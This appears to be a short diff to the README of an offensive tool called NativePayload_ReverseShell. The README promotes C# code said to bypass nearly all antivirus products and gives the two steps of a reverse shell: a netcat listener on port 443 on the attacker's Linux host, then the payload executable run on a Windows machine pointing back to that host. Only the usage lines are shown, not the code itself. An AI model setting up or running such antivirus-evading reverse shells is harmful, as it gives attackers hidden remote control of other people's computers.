@@ -3,7 +3,7 @@ This is Simple C# Source code to Bypass almost "all" AVS, (kaspersky v19, Eset v
 
 Note: it is "kind of Reverse shell", Can You Guess "Since When" : This Code Worked & Still Working... ? 
 
-    //// Step 1 (linux Side:192.168.56.1)   : nc -l -p 443 
+    //// Step 1 (Linux Side:192.168.56.1)   : nc -l -p 443 
  
     //// Step 2 (Windows Side:192.168.56.x) : NativePayload_ReverseShell.exe 192.168.56.1 443 
     
